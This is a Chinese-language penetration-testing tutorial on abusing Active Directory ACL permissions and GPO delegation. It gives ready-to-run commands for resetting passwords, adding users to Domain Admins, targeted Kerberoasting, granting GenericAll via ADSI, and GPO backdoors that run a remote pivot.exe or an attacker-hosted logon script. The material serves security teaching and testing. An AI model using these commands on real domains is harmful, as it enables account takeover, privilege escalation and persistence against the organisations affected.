# 滥用 Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**本页面主要总结了来自** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **和** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**的技术。有关更多详细信息，请查看原始文章。**

## BadSuccessor

{{#ref}}
BadSuccessor.md
{{#endref}}

## **用户的 GenericAll 权限**

此权限授予攻击者对目标用户帐户的完全控制。一旦使用 `Get-ObjectAcl` 命令确认了 `GenericAll` 权限，攻击者可以：

- **更改目标的密码**：使用 `net user <username> <password> /domain`，攻击者可以重置用户的密码。
- **针对性 Kerberoasting**：将 SPN 分配给用户帐户，使其可进行 Kerberoasting，然后使用 Rubeus 和 targetedKerberoast.py 提取并尝试破解票证授予票证 (TGT) 哈希。
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: 禁用用户的预身份验证，使其账户容易受到ASREPRoasting攻击。
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll 权限在组上**

此权限允许攻击者操纵组成员资格，如果他们在像 `Domain Admins` 这样的组上拥有 `GenericAll` 权限。在使用 `Get-NetGroup` 确定组的区分名称后，攻击者可以：

- **将自己添加到 Domain Admins 组**：这可以通过直接命令或使用像 Active Directory 或 PowerSploit 这样的模块来完成。
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write on Computer/User**

拥有计算机对象或用户帐户的这些权限允许：

- **Kerberos Resource-based Constrained Delegation**: 允许接管计算机对象。
- **Shadow Credentials**: 使用此技术通过利用创建影子凭据的权限来冒充计算机或用户帐户。

## **WriteProperty on Group**

如果用户对特定组（例如，`Domain Admins`）的所有对象具有 `WriteProperty` 权限，他们可以：

- **Add Themselves to the Domain Admins Group**: 通过结合使用 `net user` 和 `Add-NetGroupUser` 命令实现，此方法允许在域内提升权限。
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **自我（自我成员）在组中**

此权限使攻击者能够通过直接操纵组成员资格的命令将自己添加到特定组，例如 `Domain Admins`。使用以下命令序列可以实现自我添加：
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

一个类似的权限，这允许攻击者通过修改组属性直接将自己添加到组中，如果他们在这些组上拥有 `WriteProperty` 权限。此权限的确认和执行通过以下方式进行：
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

持有用户的 `ExtendedRight` 权限以进行 `User-Force-Change-Password` 允许在不知道当前密码的情况下重置密码。可以通过 PowerShell 或其他命令行工具验证此权限及其利用，提供多种重置用户密码的方法，包括交互式会话和非交互式环境中的单行命令。这些命令从简单的 PowerShell 调用到在 Linux 上使用 `rpcclient`，展示了攻击向量的多样性。
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner 权限在组上**

如果攻击者发现他们对一个组拥有 `WriteOwner` 权限，他们可以将该组的所有权更改为自己。这在该组是 `Domain Admins` 时尤其具有影响力，因为更改所有权允许对组属性和成员资格进行更广泛的控制。该过程涉及通过 `Get-ObjectAcl` 确定正确的对象，然后使用 `Set-DomainObjectOwner` 通过 SID 或名称修改所有者。
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

此权限允许攻击者修改用户属性。具体来说，拥有 `GenericWrite` 访问权限的攻击者可以更改用户的登录脚本路径，以便在用户登录时执行恶意脚本。这是通过使用 `Set-ADObject` 命令更新目标用户的 `scriptpath` 属性，使其指向攻击者的脚本来实现的。
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

通过此权限，攻击者可以操纵组成员资格，例如将自己或其他用户添加到特定组中。此过程涉及创建凭据对象，使用它来添加或移除用户，并使用 PowerShell 命令验证成员资格更改。
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

拥有一个 AD 对象并且对其具有 `WriteDACL` 权限使攻击者能够授予自己对该对象的 `GenericAll` 权限。这是通过 ADSI 操作实现的，允许对该对象进行完全控制并能够修改其组成员资格。尽管如此，在尝试使用 Active Directory 模块的 `Set-Acl` / `Get-Acl` cmdlets 利用这些权限时仍然存在限制。
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **域上的复制 (DCSync)**

DCSync 攻击利用域上的特定复制权限，模拟域控制器并同步数据，包括用户凭据。这个强大的技术需要像 `DS-Replication-Get-Changes` 这样的权限，允许攻击者在没有直接访问域控制器的情况下，从 AD 环境中提取敏感信息。[**在这里了解更多关于 DCSync 攻击的信息。**](../dcsync.md)

## GPO 委派 <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO 委派

委派管理组策略对象 (GPO) 的访问权限可能会带来重大安全风险。例如，如果用户如 `offense\spotless` 被委派 GPO 管理权限，他们可能拥有 **WriteProperty**、**WriteDacl** 和 **WriteOwner** 等权限。这些权限可能被滥用用于恶意目的，使用 PowerView 识别：`bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### 枚举 GPO 权限

要识别配置错误的 GPO，可以将 PowerSploit 的 cmdlet 链接在一起。这允许发现特定用户有权限管理的 GPO：`powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**应用特定策略的计算机**：可以解析特定 GPO 应用到哪些计算机，帮助理解潜在影响的范围。`powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**应用于特定计算机的策略**：要查看应用于特定计算机的策略，可以使用 `Get-DomainGPO` 等命令。

**应用特定策略的 OU**：可以使用 `Get-DomainOU` 识别受特定策略影响的组织单位 (OU)。

您还可以使用工具 [**GPOHound**](https://github.com/cogiceo/GPOHound) 来枚举 GPO 并查找其中的问题。

### 滥用 GPO - New-GPOImmediateTask

配置错误的 GPO 可以被利用来执行代码，例如，通过创建一个立即的计划任务。这可以用来将用户添加到受影响机器的本地管理员组，从而显著提升权限：
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

GroupPolicy模块（如果已安装）允许创建和链接新的GPO，并设置首选项，例如注册表值，以在受影响的计算机上执行后门。此方法要求更新GPO，并且用户必须登录计算机以执行：
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - 滥用 GPO

SharpGPOAbuse 提供了一种通过添加任务或修改设置来滥用现有 GPO 的方法，而无需创建新的 GPO。此工具需要修改现有 GPO 或使用 RSAT 工具在应用更改之前创建新的 GPO：
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### 强制策略更新

GPO 更新通常每 90 分钟发生一次。为了加快此过程，特别是在实施更改后，可以在目标计算机上使用 `gpupdate /force` 命令强制立即更新策略。此命令确保对 GPO 的任何修改在下一个自动更新周期之前立即应用。

### 背后的机制

检查给定 GPO 的计划任务时，可以确认添加了诸如 `evilTask` 的任务。这些任务是通过脚本或命令行工具创建的，旨在修改系统行为或提升权限。

任务的结构，如 `New-GPOImmediateTask` 生成的 XML 配置文件所示，概述了计划任务的具体细节，包括要执行的命令及其触发器。该文件表示如何在 GPO 中定义和管理计划任务，提供了一种作为政策执行一部分执行任意命令或脚本的方法。

### 用户和组

GPO 还允许在目标系统上操纵用户和组的成员资格。通过直接编辑用户和组政策文件，攻击者可以将用户添加到特权组，例如本地 `administrators` 组。这是通过委派 GPO 管理权限实现的，允许修改政策文件以包含新用户或更改组成员资格。

用户和组的 XML 配置文件概述了这些更改是如何实施的。通过向该文件添加条目，可以授予特定用户在受影响系统上的提升权限。这种方法提供了一种通过 GPO 操作直接进行权限提升的途径。

此外，还可以考虑其他执行代码或维持持久性的方式，例如利用登录/注销脚本、修改注册表键以实现自动运行、通过 .msi 文件安装软件或编辑服务配置。这些技术提供了通过滥用 GPO 维持访问和控制目标系统的多种途径。

## 参考文献

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
